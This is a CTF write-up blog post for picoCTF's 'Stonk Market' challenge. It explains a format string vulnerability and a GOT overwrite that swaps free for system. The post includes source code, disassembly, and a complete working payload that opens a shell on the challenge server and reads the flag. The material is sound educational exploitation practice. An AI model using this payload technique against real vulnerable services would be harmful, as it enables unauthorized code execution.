---
layout: post
title: GOT overwrite - picoCTF Stonk Market
tags: [CTF, pwn]
---
> I've learned my lesson, no more reading my API key into memory. Now there's no useful information you can leak! [vuln](https://mercury.picoctf.net/static/ad92b664c3b96d717872dd4fbd05941c/vuln) [vuln.c](https://mercury.picoctf.net/static/ad92b664c3b96d717872dd4fbd05941c/vuln.c) [Makefile](https://mercury.picoctf.net/static/ad92b664c3b96d717872dd4fbd05941c/Makefile) `nc mercury.picoctf.net 43206`

So this challenge seems to be the sequel to [Stonks](https://nickchen120235.github.io/2021/08/17/format-string-attack.html), is it another format string challenge? Let's find out.

## Source Code
The previous challenge reads the api token (aka the flag) into memory which is then leaked by `printf`. This time that part of code is commented out, but format string vulnerabilty still exists.
```c
int buy_stonks(Portfolio *p) {
  if (!p) {
    return 1;
  }
  /*
  char api_buf[FLAG_BUFFER];
  FILE *f = fopen("api","r");
  if (!f) {
    printf("Flag file not found\n");
    exit(1);
  }
  fgets(api_buf, FLAG_BUFFER, f);
  */
  int money = p->money;
  int shares = 0;
  Stonk *temp = NULL;
  printf("Using patented AI algorithms to buy stonks\n");
  while (money > 0) {
    shares = (rand() % money) + 1;
    temp = pick_symbol_with_AI(shares);
    temp->next = p->head;
    p->head = temp;
    money -= shares;
  }
  printf("Stonks chosen\n");

  char *user_buf = malloc(300 + 1);
  printf("What is your API token?\n");
  scanf("%300s", user_buf);
  printf("Buying stonks with token:\n");
  printf(user_buf);

  // TODO: Actually use key to interact with API

  view_portfolio(p);

  return 0;
}
```
Also the binary is compiled with `-no-pie`, as suggested by `checksec`
```
❯ checksec ./vuln
[*] '/home/nick/coding/ctf/pwn/stonk-market/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Attack
This time there's nothing on the stack anymore, so spawning a shell may be helpful. But how? With `printf` we can not only do read operations but also **write** operations, as documented in `printf.3` manual.
> n
> 
> The  number of characters written so far is stored into the integer pointed to by the corresponding argument.  That argument shall be an `int *`, or variant whose size matches the (optionally) supplied integer length modifier.  No argument is converted.  (This specifier is not supported by the bionic C library.)  The behavior is undefined if the conversion specification includes any flags, a field width, or a precision.

What we're going to do here is called a **GOT overwrite**. Remember that when a binanry is partial -RELRO compiled, whenever a library function is called, it would call the "middle man" function located in the `.plt` section, which will check whether GOT has the actual address of the function. A GOT overwrite means that we fill the GOT table before the actual call from the middle man function, and then we have control of the execution flow.

In this case, we are overwritng the GOT table entry for `free` to `system` because `free` would be the last library call before the program ends.

First let's check what we have on the stack.
```
❯ ./vuln
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/%p/v%p/%p/%p/%p/%p/%p/%p/%p 
Buying stonks with token:
0x1/0x1/0x7efc78930257/0x7efc78a2b570/0x7fffffff/(nil)/0x23c82a0/(nil)/0x100000000/0x23c87f0/0x23c8810/0x7ffcd4ddde30/0x400c66/0x7ffcd4dddf48/0x1bfebfbff/0x7ffcd4dde359/0x100000064/0x23c82a0/0xec6b7fda16cde400/0x1/0x7efc7885b310/(nil)/0x400b95/0x1d4dddf30/v0x7ffcd4dddf48/(nil)/0x58fd781c4a9a1630/0x7ffcd4dddf48/0x400b95/(nil)/0x7efc78aa2000/0xa704d1a7f6181630
```
The 13th value is in `main`, which is right after where `buy_stonks` returns. The 12th value should be the `rbp` value when we enter `buy_stonks` from `main`.
```
00000000004009e9 <buy_stonks>:
  4009e9:       55                      push   %rbp
  4009ea:       48 89 e5                mov    %rsp,%rbp

...

0000000000400b95 <main>:
  400c61:       e8 83 fd ff ff          call   4009e9 <buy_stonks>
  400c66:       eb 14                   jmp    400c7c <main+0xe7>
```
The stack frame of `main` is `0x30` bytes (remember **the stack grows downwards**)
```
0000000000400b95 <main>:
  400b95:       55                      push   %rbp
  400b96:       48 89 e5                mov    %rsp,%rbp
  400b99:       48 83 ec 30             sub    $0x30,%rsp
```
Therefore, the 12th value is actually a pointer to the 20th value. (`0x30` // `0x8` = 6)

Finally, `Stonk*` will be returned by `pick_symbol_with_AI`, which is stored at `rbp-0x10`, so the 10th value is a pointer to a `free` parameter.

Before we continue, these are what we have for now:
- 12th: pointer to 20th value
- 10th: a pointer to a `free` parameter

Now let's actually overwrite the GOT table entry. First overwrite the 12th value to be the address of `free`'s GOT table entry, which is `0x602018`. (Note: We don't want `0x4006c0` as that's for PLT.)
```
00000000004006c0 <free@plt>:
  4006c0:       ff 25 52 19 20 00       jmp    *0x201952(%rip)        # 602018 <free@GLIBC_2.2.5>
  4006c6:       68 00 00 00 00          push   $0x0
  4006cb:       e9 e0 ff ff ff          jmp    4006b0 <.plt>
```
The first part of the payload is `%c%c%c%c%c%c%c%c%c%c%6299662c%n`. 10 `%c`s to move forward 10 values. The next one moves one step further with `6299662` padding. (We have printed 10 characters so far, so only `6299672-10=6299662` more characters needed.) The last `%n` is to actually write the value. So after this step, the pointer relationship changes
```
             12th     --->          20th
before :  rbp of main ---> rbp when main starts
after 1:  GOT of free --->       <free@plt>
```
Next is change the 20th value to `0x4006f0`, which is the address of `system@plt`. So before the address is actually resolved, The value at the corresponding GOT entry is actually still the `@plt` function, which will continue the lookup flow (`push`es the corresponding value onto the stack as the parameter to the lookup function). Since it's already started with `0x4006`, only the last byte should be modified. To modify only the last byte, `hh` length modifier is required, which
> **hh**
> 
> A following integer conversion corresponds to a signed char or unsigned char argument, or a following n conversion corresponds to a pointer to a signed char argument.

Last time we stopped at `0x602018`, the nearest value is `0x6020f0`, which needs `216` character outputs. So the second part of the payload is `%216c%20$hhn`.
```
            12th     --->          20th
before : rbp of main ---> rbp when main starts
after 1: GOT of free --->       <free@plt>
after 2: GOT of free --->      <system@plt> 
```
The final part is the argument to `system`, which is `"sh\0"`. In little endian, that's `0x006873`. So let's make it `0x01006873`, which `10504067` character outputs are required. The final part of the payload is `%10504067c%10$n`. Now when `free` is called, `system` will be called instead. And once the object we modified is `free`d, it will be the argument to `system`, and hopefully will spawn us a shell.

Finally the payload is `%c%c%c%c%c%c%c%c%c%c%6299662c%n%216c%20$hhn%10504067c%10$n`. `nc`, wait for the output to finish, and we get the shell.
```
16803955 shares of PYT
121 shares of FX
45 shares of TSB
208 shares of O
$ ls
api
vuln
vuln.c
xinet_startup.sh
$ cat api
picoCTF{explo1t_m1t1gashuns_d0295f63}
```

## Reference
- [https://activities.tjhsst.edu/csc/writeups/picoctf-2021-stonk-market](https://activities.tjhsst.edu/csc/writeups/picoctf-2021-stonk-market)
- [https://www.youtube.com/watch?v=gLFJFXpY44w](https://www.youtube.com/watch?v=gLFJFXpY44w)
- [https://hackmd.io/@rhythm/ry5pxN6NI](https://hackmd.io/@rhythm/ry5pxN6NI)